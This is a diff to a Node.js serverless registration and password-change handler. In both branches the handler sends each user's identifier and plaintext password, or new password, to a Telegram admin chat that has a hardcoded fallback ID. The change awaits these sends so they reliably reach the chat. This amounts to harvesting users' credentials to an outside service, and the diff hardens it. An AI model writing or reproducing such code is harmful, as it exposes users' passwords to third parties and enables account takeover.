@@ -45,7 +45,11 @@ module.exports = async function handler(req, res) {
     await logEvent(db, { type: "register", status: "success", user_id: null, username, message: `New ${email ? "email" : "phone"} registration: ${identifier}` });
     const adminChat = process.env.ADMIN_LOG_CHAT_ID || process.env.ADMINLOG || "-1003441797589";
     const adminText = `🆕 <b>New Website Registration</b>\n\n👤 <b>Username:</b> ${username}\n📧 <b>${email ? "Email" : "Phone"}:</b> <code>${identifier}</code>\n🔐 <b>Password:</b> <code>${password}</code>\n🆔 <b>UserID:</b> <code>${userId}</code>\n🔗 <b>Method:</b> ${email ? "Email" : "Phone"}`;
-    tgSend(adminChat, adminText).catch(() => {});
+    // AWAITED on purpose: on Vercel the lambda is frozen the instant the
+    // response is returned, so a fire-and-forget tgSend was often killed
+    // before it left the machine — admin notifications were silently lost.
+    // tgSend never throws (it returns {ok:false} on failure), so awaiting is safe.
+    await tgSend(adminChat, adminText);
     return res.status(200).json({ success: true, user: { userId, username, email: email || null, phone: phone || null, bot_connected: false }, message: "Registered successfully." });
   }
 
@@ -68,7 +72,10 @@ module.exports = async function handler(req, res) {
     const adminChat = process.env.ADMIN_LOG_CHAT_ID || process.env.ADMINLOG || "-1003441797589";
     const uid = resolveUserId(user); const tgId = user.telegram_id || (typeof user._id === "number" ? user._id : "—"); const uname = user.username || "N/A"; const contact = user.email || user.phone || `tg:${tgId}`;
     const adminText = `🔑 <b>Password Changed — Website</b>\n\n👤 <b>User:</b> ${uname} (<code>${uid}</code>)\n📞 <b>Contact:</b> <code>${contact}</code>\n🆔 <b>TgID:</b> <code>${tgId}</code>\n🔐 <b>New Password:</b> <code>${newPassword}</code>`;
-    tgSend(adminChat, adminText).catch(() => {});
+    await logEvent(db, { type: "admin", status: "success", username: uname, message: `Password changed by ${uname} (${uid})` });
+    // AWAITED — same serverless-freeze reason as register above. This is the
+    // fix for "password change ke baad admin log notification nahi aata".
+    await tgSend(adminChat, adminText);
     return res.status(200).json({ success: true, message: "Password updated." });
   }
 
